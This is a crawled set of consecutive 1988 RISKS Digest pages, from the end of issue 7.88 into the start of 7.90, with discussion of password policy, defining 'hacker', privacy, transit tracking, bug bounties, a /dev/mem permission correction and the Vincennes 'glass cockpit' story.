come, standard equipment, flat price; ditto the dashboard warning light and
buzzer.  Now, one *can* disconnect that annoying buzzer, or short out the
connection under the seat to fool the buzzer.  The cars are NOT tamper
proof; but they are shipped with driver safety in mind.

By analogy, DEC could ship VMS with all the passwords "expiring" most
ESPECIALLY those on "privileged" accounts [e.g., System, Operator], and then go
into a "closed loop" that could be exited only after the "user" [system, or
operator, in this case] selected and installed a *computer generated* password.
ONLY then could the installation be completed; only then could the privileged
accounts of "system managers" execute routines to allow users to generate their
own passwords, default files to "public access" etc. etc.  etc. ad insecurity.

I'm not picking on DEC; I happen to use -- and like -- VMS.  I use that example
because I can make it credibly.  As most of you know, VMS is one of the few
systems that has earned its "C2."
                                                  Bob

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Talk on Computer Fraud
</A>
</H3>
<address>
Mark Mandel 
&lt;<A HREF="mailto:Mandel@BCO-MULTICS.HBI.HONEYWELL.COM">
Mandel@BCO-MULTICS.HBI.HONEYWELL.COM
</A>&gt;
</address>
<i>
Mon, 5 Dec 88 11:06 EST
</i><PRE>

  Topic:   "Computer Fraud: Motivation, Method and Opportunity"
  Speaker: Tom Blake, Arthur Young, Boston, 
  Date:    Wed 14 Dec  5:30 pm  Anthony's Pier 4 Boston
  Host: Mayflower Chapter, ASM (Association for Systems Management)
  Register: Beth Furey (617) 367-3161  Admission/registration charge: $25.00

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
defining "hackers and crackers"
</A>
</H3>
<address>
Gordon Meyer 
&lt;<A HREF="mailto:TK0GRM1@NIU.BITNET">
TK0GRM1@NIU.BITNET
</A>&gt;
</address>
<i>
Mon, 05 Dec 88 21:24 CST
</i><PRE>

I would argue that creating a new term to refer to the more...  "illicit"
users of computer system would do little to help solve the confusion.  In my
experience the "less malicious" use of the word HACKER is found almost
entirely in professional computing circles.  The media and general public
know the term to mean "illegal, unauthorized and malicious computer use". (I
just made that definition up...the quotes are used for emphasis not to
indicate another source.)  

If the computer science community continues to hold on to the term "hacker"
they will only create more confusion and ambiguity in the future.  While I
realize that the term may be nostalgic for some of you, english is not a
static language and continuing to use an "outdated" definition of the term
serves little purpose.  

PS:  Just to add a little more confusion to the issue, the term "cracker" is
sometimes used to refer to those software pirates with the programming
ability to remove copy protection.  If folks insist on creating a new name
for the "illicit" users out there..."crackers" is probably not the best
choice. &lt;grin&gt;

Gordon R. Meyer, Dept of Sociology, Northern Illinois University.
GEnie: GRMEYER  CIS: 72307,1502  Phone: (815) 753-0365

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
RISKS DIGEST 7.87 [RISKS OF GREATER GARBLE]
</A>
</H3>
<address>
&lt;<A HREF="mailto:[somewhere in netland]">
[somewhere in netland]
</A>&gt;
</address>
<i>
6 Dec 88 06:02:08 GMT
</i><PRE>

I EXCERPTED A FEW GARBLED LINES FROM A RETURNED COPY OF <A HREF="/Risks/7.87.html">RISKS-7.87</A>.  
[SIC] GLORIOUS TRANSIT MONDAY's ISSUE.

RIQKS-LIST: RISKS-FORUM Digest  Molday 5 December 1988   Volume 7 8 Issue 87
        FORUM ON RISJS TO THE PUBLIC IN COMPUTERS AN@ RELATED SYSTEMS 
   ACM Committee on Computers and Public Poli`y, Peter G. Neumann, moderator
  DEC @net and "denial of service" att`cks (Willie Smith)
    (P`ul E. McKenney, Kendall Collett, PGN)
    (Fpank Maginnis, PGN, FM, Darrell @ong, Alex Colvin)
  Computer Riqks Revisited (John Markoff)
taste, objective, aoherent, concise, and nonrepetitious.  Diversity is welcome.
COLTRIBUTIONS to RISKS@CSL.SRI.COM( with relevant, substantive "Su`ject:" line
From: Jerry Harp`r &lt;jharper@euroies.UUCP&gt;
This is exaerpted from THE IRISH TIMES of pwo weeks back:
The Department mf Health was accused yesterday of committing some [$67m] of
State funds to the purchase of an iladequate computer system for the health 
service.  Eleven millimn pounds will already have been spent on the project
Flanagan, told the Dail [our parliament] Committee of Public A`counts.
...[the decision taken in 1982 to computerise governmenp services... deleted]
   ...Auditor General,Mr Patrick McDonnell, expressed his disquiet at tha
lack of planning since that date, and at the fact that no cost`ng was done
until May 1985, by thich time [$67m] was committed.$.
   ...Lr Flanagan said [$670,000] had `een spent on management consult`ncy.  In
his opinion, this was talue for money, despite the fact that some of the
hardware provdd to be inadequate with high maantenance costs, and certain itels
had to be sold off at half-prhce to health boards.  In particqlar, the
committee heard that threee of the mini-computers whic` had cost approximately
subsequently supplied to t`e Eastern Health Board at [$41,000] each.
   ...[deleted piece about the report being referred po the Minister]"
"loojed after" by the closely related McAuto.  An enormous amount of pressure
system.  Thd pressure came from the company through the usual sales hype an`
several politicians attempting to bend individuals ears.  A selior consultant I
one stage that maintenan`e people were practically livind in the hospital.  I
don't attrhbute culpability for the deficiencies of the system to any of t`e
Not exactly a risk of computerp, but definitely a risk to softrare engineers:
during the early days of the war in Vietnam, thepe were some IBM programmers
war effort, that without thel the computers would not perform.  The IBM manager
threatened tn go to superior authorities, so the Army commander then said that
the nearby airbase was under `ttack and there were no flights available for
evacuation.  I neper heard the resolution of this story, but it was clear these
ppogrammers got more than they bapgained for.

  [And then it is OK after that.  The last time we ran such an item, it was
  a compression/decompression screw-up.  Here it is just delted or garpled
  characters.  I thought that there might have been an addded character, but
  then I noticed that "threee" is in the original.  The time has come, the 
  Mailrus said, or is this the legend of Tut?  (See Path, above.)  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.87.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.89.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-41</DOCNO>
<DOCOLDNO>IA012-000131-B035-430</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.89.html 128.240.150.127 19970217024348 text/html 19893
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:42:03 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 89</TITLE>
<LINK REL="Prev" HREF="/Risks/7.88.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.90.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.88.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.90.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 89</H1>
<H2> Tuesday 6 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Computer Literacy #4 
</A>
<DD>
<A HREF="#subj1.1">
Ronni Rosenberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Privacy versus honesty/equality 
</A>
<DD>
<A HREF="#subj2.1">
Jerry Carlin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computerized speeding tickets? 
</A>
<DD>
<A HREF="#subj3.1">
Clifford Johnson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Subways that "know" who's on board 
</A>
<DD>
<A HREF="#subj4.1">
Marc J Balcer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Automatic toll systems -- Dallas 
</A>
<DD>
<A HREF="#subj5.1">
Andrew R. MacBride
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  "Hackers", "crackers", "snackers", and ethics 
</A>
<DD>
<A HREF="#subj6.1">
"Maj. Doug Hardie"
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  `hacker' is already a dictionary entry 
</A>
<DD>
<A HREF="#subj7.1">
Joe Morris
</A><br>
<A HREF="#subj7.2">
 Douglas Jones
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: /dev/*mem and superuser 
</A>
<DD>
<A HREF="#subj8.1">
Jeff Makey
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Computer Literacy #4
</A>
</H3>
<address>
Ronni Rosenberg
&lt;<A HREF="mailto:ronni@wheaties.ai.mit.edu ">
ronni@wheaties.ai.mit.edu 
</A>&gt;
</address>
<i>
Tue, 6 Dec 88 15:12:11 EST
</i><PRE>

What are your reactions to a proposal for a different sort of "computer
literacy" course, described below?  (I am not saying that all schools should
teach such a course.)  Is it a good or bad idea?  Why?  Should the description
be changed?  If so, how?  How do you compare this with what you know about
existing computer-literacy courses?  Who should develop such a curriculum?
Who should pay for it?  Please respond directly to me.  Thanks.

	      *               *               *               *

Compared to current computer-literacy classes, the proposed course would spend
much less time reviewing the mechanics of operating machines, the syntax of
applications software or programming languages, and rote learning of lists,
from computer components to uses.  It would spend much more time considering
the capabilities and limitations of computers, through discussions of the
impacts of important computer applications.  This might be a standalone course
or a series of discussions interwoven into courses in, for instance, social
studies or history.

One specific example of material that could contribute to meaningful education
about computers is a multi-media presentation entitled "Reliability and
Risk: Computers and Nuclear War," produced and distributed by CPSR.  The
presentation explains how current political and military trends decrease
the time allowed for people to react to a crisis, thereby shifting critical
decision-making responsibilities to computers.  It attacks the myth of
computer infallibility by describing different types of computer errors, their
sources and consequences.  It explores the growing reliance on computerized
decision-making and how a computer error, especially in times of crisis, could
trigger an accidental nuclear war.  Lasting a half-hour, the program obviously
cannot cover the topic in great depth.  But it does present salient points
about an important and complex area of computer use, greatly heightens
people's awareness of problems that they are unlikely to learn about from
magazine articles about computers, and stimulates exciting discussions and
further thought.  The presentation uses no computers, and the intended
audience need no previous computer experience.

The proposed course might include discussions of
 *  SDI's computing requirements -- so students could consider the concept of
    software trusthworthiness and the potential for design errors in complex
    systems.
 *  The Vincennes episode -- so they could consider the difficulty of using a
    system outside the boundaries of its intended use.
 *  The FBI's National Crime Information Center (NCIC) -- so they could 
    consider the relationship between civil liberties and computer technology.
 *  The National Test Bed, war games -- so they could consider the limits of
    computer simulations.
 *  Computerized monitoring techniques -- so they could consider impacts of
    computers on the workplace.
 *  How computer science is funded -- so they could consider which sorts of
    problems society views as important.
 *  Some of the myriad of RISKS stories -- so they could consider the risks of
    depending on computer systems.

And so on.  Overall, the course would emphasize the importance of the social
and political context in which a computer system is developed and used.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Privacy versus honesty/equality
</A>
</H3>
<address>
Jerry Carlin
&lt;<A HREF="mailto:jmc@ptsfa.PacBell.COM ">
jmc@ptsfa.PacBell.COM 
</A>&gt;
</address>
<i>
1 Dec 88 20:45:26 GMT
</i><PRE>
Organization: Pacific * Bell, San Ramon, CA

The following is from an article: "In Sweden, the public can read 
prime minister's mail" by Eva Janzon, Associated Press.

In Sweden, government records have been open to the public since 1766.
This includes the right to read the Prime Minister's mail (except for
a few classified items). Not only that, but everyone's records are
effectively public:

	"Knowing your neighbor's date of birth is enough to gain access
	to files at the National Taxation Board which lists income and
	tax from the previous year, church membership, marital status
	and current address.

	"If you take the number to the county police, you can find out
	about any unpaid bills.  Other registers list education, state of
	health and membership in associations.

	"All this has been accepted as a price for keeping people honest
	in a society that strives for equality."

The article did state that some Swedes dislike this invasion of privacy.

Is the risk of inequality and dishonesty more important than the risk 
to privacy?

Jerry Carlin (415) 823-2441 {bellcore,sun,ames,pyramid}!pacbell!jmc

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Computerized speeding tickets?
</A>
</H3>
<address>
"Clifford Johnson" 
&lt;<A HREF="mailto:GA.CJJ@Forsythe.Stanford.EDU">
GA.CJJ@Forsythe.Stanford.EDU
</A>&gt;
</address>
<i>
Mon,  5 Dec 88 17:54:29 PST
</i><PRE>

&gt; Alas, as a Mass police officer pointed out in an interview, you have to catch
&gt; someone *in the act* of speeding to get them for it.  Probably something to 
&gt; do with that annoying bill of rights...

Not so in every state, I believe.  I recall a news story some 18 years ago in a
desert state (Arizona?), in which a cop called a another cop at another town to
look out for a certain car.  The defense argued that there was no way to know
to for sure that the speed limit was exceeded merely because the distance/time
in total exceeded the speed limit.  A university mathematician (measure
theorist) testified as to the meaning of the Mean Value Theorem, and the
speeding ticket was upheld by a presumably puzzled judge because no
counter-expert could be found to dispute him.

Does anyone know whether the Mass. "rule" is simply local?

   [And then there is the tale of the San Francisco police using computer
   records interactively to tow up-scale vehicles (on the grounds that their
   owners are more likely to pay up to get their cars back when towed).
   Yesterday they towed a car belonging to an undercover agent.  Referring
   to Ronni's item (particularly NCIC) in this issue, suppose that 
   information was in the computer that that car belonged to an undercover
   agent.  Then we have to assume that the agent was NOT ADEQUATELY under
   cover, especially if any further identification was included.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Subways that "know" who's on board
</A>
</H3>
<address>
Marc J Balcer
&lt;<A HREF="mailto:balcer@gypsy.siemens.com ">
balcer@gypsy.siemens.com 
</A>&gt;
</address>
<i>
Tue, 6 Dec 88 09:38:49 EST
</i><PRE>

From the Philadelphia Inquirer, Saturday, December 3:

SEPTA TURNSTILES TAKE A HIGH-TECH SPIN
by Mark Bowden, Inquirer Staff Writer

[...]  The new turnstiles still accept tokens, but they are also equipped with
magnetic scanners that enable passengers to let themselves into the station
just by sliding through their new, magnetically encoded weekly and monthly
passes.  The old turnstiles only accepted tokens.  [...]  Because each of the
turnstiles is connected to a central computer, and each card is encoded with a
serial number, use of the new turnstiles will help SEPTA compile far more
detailed records of how people use the transit system.

"If someone gets on the Elevated in the Northeast, uses the Broad Street Subway
at midday, and then commutes home at night on the Elevated, we will have an
exact record of all those trips," said [Robert E.] Wooten, SEPTA assistant
general manager for public affairs."  It will provide our operations planning
department with lots of detailed information about who gets on where, when, and
how often.

Marc J. Balcer    [balcer@gypsy.siemens.com]      (609) 734-6531
Siemens Research Center, 755 College Road East, Princeton, NJ 08540

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Automatic toll systems -- Dallas
</A>
</H3>
<address>
&lt;<A HREF="mailto:c60a-1bl@WEB.Berkeley.EDU">
c60a-1bl@WEB.Berkeley.EDU
</A>&gt;
</address>
<i>
Tue, 6 Dec 88 00:19:16 PST
</i><PRE>

	Regarding an earlier discussion of automatic toll systems:

	This evening (~11:45pm PST) on CNN, I caught the tail end of a
report on an automated toll-collection system being tested in Dallas.
The device consists of (and I quote) "chips and diodes and capacitors
on a board", and is apparently queried at each toll station. During a
brief statement, the president(?) of AMTECH, Inc. discussed plans
for the use of this system in many cities and in the rail network.

	Anyone have comments or more information?
	(I wish I had seen the beginning of the report...)

Andrew R. MacBride     c60a-1bl@widow.berkeley.edu (128.32.185.4)

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
"Hackers", "crackers", "snackers", and ethics (<A HREF="/Risks/7.86.html">RISKS-7.86</A>)
</A>
</H3>
<address>
"Maj. Doug Hardie" 
&lt;<A HREF="mailto:Hardie@DOCKMASTER.ARPA">
Hardie@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Tue, 6 Dec 88 09:42 EST
</i><PRE>

&gt; Moreover, in more mature scientific fields, such as medicine, it
&gt; is not left up to the experimenter to decide for himself what is
&gt; ethically acceptable; he or she must convince review boards that
&gt; include both peers and (one hopes) members of the affected public.

The cost of medical research is significant.  It is not within the resources of
your average high school student.  The cost of hacking "computer research" is
very low.  I seriously doubt that any kind of review system could be set up
that would be able to cope with the volume of this problem.  Even if you could
set it up, it would be a bureaucracy unto itself.

Also, I point out that the term hacker was in common use when I was in college
(64-69) to refer to a person who did not have any real understanding of what
they were doing, but just banged away with anything in a random pattern hoping
that something would work.  Calling an engineering student a hacker was the
ultimate put down.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
`hacker' is already a dictionary entry
</A>
</H3>
<address>
Joe Morris (jcmorris@mitre.arpa) 
&lt;<A HREF="mailto:jcmorris@mitre.arpa">
jcmorris@mitre.arpa
</A>&gt;
</address>
<i>
Tue, 06 Dec 88 11:38:21 EST
</i><PRE>

In <A HREF="/Risks/7.87.html">RISKS-7.87</A>, Frank Maginnis observes:
&gt;                                    "Hacker" and "virus" will undoubtedly
&gt;appear very soon in standard English dictionaries with the general public's
&gt;understanding of the terms, not the profession's -- "hacker" probably
&gt;already has! We'll just have to adapt.

I can't speak for 'virus', but 'hacker' is already there.  From the 1986 
edition of _Webster's_New_World_Dictionary_ (Prentice-Hall) comes the
following entry:

  hack.er n. 1. a person who hacks (see hack(1)) 2. an unskilled golfer,
  tennis player, etc. 3. a talented amateur user of computers, specif. one 
  who attempts to gain unauthorized access to files in various systems

The dictionary doesn't have the verb _hack_ defined in a computer sense, but
that may be waiting on the next edition.

Can anyone point to the first use of the term?  I remember using it in 1962
(and have comments in programs to prove it) but it seemed to be well-used
by then.  

</PRE>
<HR><H3><A NAME="subj7.2">
Re: "Hackers,"  "crackers,"  "snackers,"  and ethics
</A>
</H3>
<address>
Douglas Jones 
&lt;<A HREF="mailto:jones@herky.cs.uiowa.edu">
jones@herky.cs.uiowa.edu
</A>&gt;
</address>
<i>
Tue, 6 Dec 88 13:51:24 CST
</i><PRE>

In P. G. Neumann's note of Mon, 5 Dec 88 10:27:35 PST, he points out that
we have to do something about whistle-blowing, and then gets back to questions
of hacking being dangerous, especially when we have flawed systems.  These
two statements bring to mind a sensible buisness practice of the early 1970's
that I have not seen used recently.

Back in the summer of 1972, I worked for Com-Share Incorporated, one of two
firms to commercialize the Berkeley Timesharing System.  Back then, I had not
yet heard the term "hacker", but we certainly knew that there were such people.
Com-Share had two interesting policies with regard to such people:

  1) All Com-Share employees were encouraged to use Com-Share facilities
      for personal use during off-hours, and the majority of personal use
      was assumed to be of a sort we would now call hacking.

  2) Com-Share had a standing reward of $500 for anyone who could expose
      a flaw in their system security, and while I was there, they raised
      the reward to $1000.

In concert, these policies encouraged hacking, but they made it into a
constructive activity.  An occasionally cited aspect of the "hacker ethic"
is that when hackers find something wrong with a system, they should report
the problem.  The problem is that reporting a problem might lead to its being
fixed, which in turn, might deny future access to the hacker.  A reward
can overcome this negative aspect of reporting bugs.

When I worked on the PLATO system at Illinois in the mid '70s, the system
administrators viewed the large community of PLATO hackers (mostly writing
and playing games, but with occasional password security attacks of the kmem
variety) as useful because they would exercise new system features long
before "legitimate" users would find them, and because they provided a heavy
system load before there was much of a legitimate user community.  As the
legitimate community grew and the excess capacity of the system diminished,
game playing and other "hacking" activities were severely curtailed, but
never eliminated.

In recent years, most computer crimes legislation I have seen has made
almost anything resembling hacking into a crime, and many system
administrators no-longer appear interested in the benefits that
a carefully managed hacker community can provide.  A hacker who finds
a flaw in a system and reports it is viewed as being a criminal with
a conscience instead of a benefit to society.

In a way, hackers who report flaws that they find in a system are like
whistleblowers, and this recent legal and managerial trend is quite
analogous to the "shoot-the-messenger" approach that is commonly
applied to whistleblowers.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re: /dev/*mem and superuser
</A>
</H3>
<address>
Jeff Makey 
&lt;<A HREF="mailto:Makey@LOGICON.ARPA">
Makey@LOGICON.ARPA
</A>&gt;
</address>
<i>
6 Dec 1988 1258-PST (Tuesday)
</i><PRE>

In RISKS 7.87, Paul E. McKenney &lt;mckenney@spam.istc.sri.com&gt; described
how to protect /dev/*mem on UNIX systems from uncontrolled read
access.  Unfortunately, he made a small mistake.  /bin/ps and other
programs that need access to /dev/mem should have their modes set to
2755.  Use of mode 4755 (as Paul suggested) sets the setuid bit rather
than the setgid bit.  Since /dev/mem is owned by root and Paul also
suggested changing the owner of /bin/ps to bin, there is probably no
security problem in his fix, but ps won't work.

I have done this on my 4.2 BSD system with no apparent ill effects.
In addition to /bin/ps, /usr/ucb/w needs this treatment.

Once again, we encounter a risk in (blindly) applying untested
bugfixes.  This comment, of course, applies to my own suggestions in
the paragraphs above.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.88.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.90.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-42</DOCNO>
<DOCOLDNO>IA012-000131-B036-22</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.90.html 128.240.150.127 19970217024402 text/html 24266
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:42:30 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 90</TITLE>
<LINK REL="Prev" HREF="/Risks/7.89.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.91.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.89.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.91.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 90</H1>
<H2> Thursday 8 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
"Glass cockpit" syndrome / Vincennes 
</A>
<DD>
<A HREF="#subj1.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  VDTs and premature loss of ability to focus eyes 
</A>
<DD>
<A HREF="#subj2.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  NEW YORK TIMES reviews novel about computer sabotage 
</A>
<DD>
<A HREF="#subj3.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  "hacker" et al. 
</A>
<DD>
<A HREF="#subj4.1">
RAMontante
</A><br>
<A HREF="#subj4.2">
 Russ Nelson
</A><br>
<A HREF="#subj4.3">
 Douglas Monk
</A><br>
<A HREF="#subj4.4">
     Andrew Klossner
</A><br>
<A HREF="#subj4.5">
 Kenneth Siani
</A><br>
<A HREF="#subj4.6">
 Don Mac Phee
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Unquestioning belief in expert testimony 
</A>
<DD>
<A HREF="#subj5.1">
Matt Bishop
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
"Glass cockpit" syndrome / Vincennes
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.ElSegundo@Xerox.com">
Hoffman.ElSegundo@Xerox.com
</A>&gt;
</address>
<i>
6 Dec 88 21:24:53 PST (Tuesday)
</i><PRE>

The 5 December 1988 'Los Angeles Times' reprints a lengthy 'Washington Post'
story by Sally Squires with the headline and caption:

                        PERIL FOR PILOTS
	 
    Psychologists call it the "glass cockpit" syndrome, a computer
    information overload in which the flood of technical information,
    faulty communication and outside stress lead to judgment errors.

Much of the article is drawn from testimony by American Psychological Assn.
representatives before the House Armed Forces Committee, relating to the
Vincennes shootdown in July of an Iranian commercial jetliner.  The
witnesses said the incident "was just a symptom of a larger problem facing
society."  A few quotes from the article:

  Research is badly needed to understand just how much automation to 
  introduce -- and when to introduce it -- in situations where the 
  ultimate control and responsibility must rest with human operators,
  said Richard Pew of BBN....
  
  The growing use of high-tech devices in the cockpit or on ships can
  have two seemingly contradictory effects.  One response is to lull crew
  members into a false sense of security.  They "regard the computer's
  recommendation as more authoritative than is warranted," Pew said.
  "They tend to rely on the system and take a less active role in control."
  UTexas psychologist Robert Helmreich calls it "automation complacency."
  
  Another response is to fall victim to information overload and ignore
  the many bits of data pouring from myriad technical systems.... The 
  stress of combat or poor weather or machine failure only serves to
  compound the errors that can be made.  Yet "most military personnel
  feel impervious to stress," Helmreich said....  
  
  But many stress effects can be overcome even in combat -- if people
  are conscious of their vulnerability.... Helmreich noted that when
  "multiple people verify information and decisions" there is less 
  chance of error....
  
  "Errors of the sort made by Vincennes personnel can be anticipated,
  and procedures to reduce their likelihood or their gravity can be
  instituted," said UMichigan psychologist Richard Nisbett....
  
  [Background on the multiple emergencies aboard the Vincennes at the 
  time of the shootdown.]  "The anti-air warfare officer made no attempt
  to confirm the reports [from the crew] on his own," the commander-in-
  chief of the US Central Command reported.  "Quick reference to the
  console directly in front of him would have immediately shown increasing,
  not decreasing, altitude [of the Iranian jet]."  Instead, this
  "experienced and highly qualified officer, despite all of his training,
  relied on the judgment of one or two second-class petty officers,
  buttressed by his own preconceived perception of the threat, and made
  an erroneous assessment to his commanding officer."

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
VDTs and premature loss of ability to focus eyes
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.ElSegundo@Xerox.com">
